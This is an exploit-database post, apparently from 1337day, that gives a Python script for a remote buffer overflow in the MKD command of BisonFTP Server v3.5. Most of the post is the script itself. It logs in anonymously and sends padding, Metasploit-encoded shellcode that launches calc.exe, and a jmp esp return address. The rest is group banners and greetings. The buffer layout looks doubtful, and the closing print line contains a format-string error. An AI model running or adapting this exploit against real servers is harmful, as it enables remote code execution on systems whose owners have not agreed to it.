1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : BisonFTP Server v3.5 (MKD) Remote BOF and Crash Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * sec4ever.com
# Facebook : http://facebook.com/KedAns
# platform : windows
# Impact : Remote Buffer Overflow ( in MKD command)
# Tested on : Windows XP SP3 (en)
##

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * H-KinG |
# | ------------------------------------------------- < |
###

#=====[ Exploit Code ]======>

#!/usr/bin/python

# BisonFTP Server v3.5 (MKD) Remote BOF and Crash Exploit
# Provided by : KedAns-Dz * Inj3ct0r Team

from socket import *
import sys, struct, os, time

if (len(sys.argv) < 3):
	print "\n BisonFTP Server v3.5 (MKD) Remote BOF and Crash Exploit"
	print "\n	Usage: %s <host> <port> \n" %(sys.argv[0])
	sys.exit()

print "\n[!] Connecting to %s ..." %(sys.argv[1])

# connect to host
sock = socket(AF_INET,SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))
sock.recv(1024)
time.sleep(3)

buffer = "\x90" * 1337 # padding

# windows/exec | cmd=calc.exe | x86/shikata_ga_nai (http://metasploit.com)
buffer += ("\x2b\xc9\xb1\x33\xda\xd8\xbe\xd9\x73\x14\x79\xd9\x74\x24"+
"\xf4\x5a\x83\xea\xfc\x31\x72\x0f\x03\xab\x7c\xf6\x8c\xb7"+
"\x6b\x7f\x6e\x47\x6c\xe0\xe6\xa2\x5d\x32\x9c\xa7\xcc\x82"+
"\xd6\xe5\xfc\x69\xba\x1d\x76\x1f\x13\x12\x3f\xaa\x45\x1d"+
"\xc0\x1a\x4a\xf1\x02\x3c\x36\x0b\x57\x9e\x07\xc4\xaa\xdf"+
"\x40\x38\x44\x8d\x19\x37\xf7\x22\x2d\x05\xc4\x43\xe1\x02"+
"\x74\x3c\x84\xd4\x01\xf6\x87\x04\xb9\x8d\xc0\xbc\xb1\xca"+
"\xf0\xbd\x16\x09\xcc\xf4\x13\xfa\xa6\x07\xf2\x32\x46\x36"+
"\x3a\x98\x79\xf7\xb7\xe0\xbe\x3f\x28\x97\xb4\x3c\xd5\xa0"+
"\x0e\x3f\x01\x24\x93\xe7\xc2\x9e\x77\x16\x06\x78\xf3\x14"+
"\xe3\x0e\x5b\x38\xf2\xc3\xd7\x44\x7f\xe2\x37\xcd\x3b\xc1"+
"\x93\x96\x98\x68\x85\x72\x4e\x94\xd5\xda\x2f\x30\x9d\xc8"+
"\x24\x42\xfc\x86\xbb\xc6\x7a\xef\xbc\xd8\x84\x5f\xd5\xe9"+
"\x0f\x30\xa2\xf5\xc5\x75\x5c\xbc\x44\xdf\xf5\x19\x1d\x62"+
"\x98\x99\xcb\xa0\xa5\x19\xfe\x58\x52\x01\x8b\x5d\x1e\x85"+
"\x67\x2f\x0f\x60\x88\x9c\x30\xa1\xeb\x43\xa3\x29\xc2\xe6"+
"\x43\xcb\x1a")


buffer += "\x90" * 8 # nopsled

buffer += "\x75\x74\xb9\x7c" # jmp esp - (SHELL32.DLL)

buffer += "\x0a" # end connection

# send buffer
print "[!] Sending exploit..."
sock.recv(2000)
sock.send('USER anonymous\r\n')
sock.recv(2000)
sock.send('PASS anonymous\r\n')
sock.recv(2000)
sock.send('MKD'+buffer+'\r\n')
sock.recv(2000)
sock.close()
print "[!] Exploit succeed.\n" %(sys.argv[1])
sys.exit()

#=====[ The End ]=======|

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > + Rizky Ariestiyansyah * Islam Caddy <3
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * SeeMe * XroGuE * ZoRLu * gunslinger_ 
# anT!-Tr0J4n * ^Xecuti0N3r * Kalashinkov3 (www.1337day.com/team) * Dz Offenders Cr3w * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * H-KinG * www.packetstormsecurity.org * TreX (hotturks.org)
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#=================================================================================================
